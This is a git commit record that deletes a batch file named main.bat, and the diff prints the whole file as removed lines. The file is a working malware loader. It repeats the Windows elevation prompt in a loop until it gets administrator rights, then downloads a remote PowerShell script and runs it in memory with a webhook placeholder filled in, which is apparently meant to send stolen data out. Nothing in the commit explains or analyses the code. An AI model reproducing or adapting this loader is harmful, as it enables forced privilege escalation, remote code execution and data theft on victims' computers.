033074ca58b7eeffdf5ab12f9f66080a3e05d126
grumach <110260624+grumach@users.noreply.github.com>
2024-05-19 21:03:37 +0100

    Delete main.bat

--- main.bat
+++
@@ -1,7 +0,0 @@
-@echo off
-cd /d %~dp0
-net session >nul 2>&1
-if not %errorlevel% == 0 ( powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "while($true){try{Start-Process -Verb RunAs -FilePath '%~f0';exit}catch{}}" & exit )
-powershell -c "$t = Iwr -Uri 'https://raw.githubusercontent.com/grumach/same/main/main.ps1' -UseBasicParsing; $t -replace 'YOUR_WEBHOOK_HERE', 'YOUR_WEBHOOK_HERE2' | iex"
-timeout 3 > nul
-exit
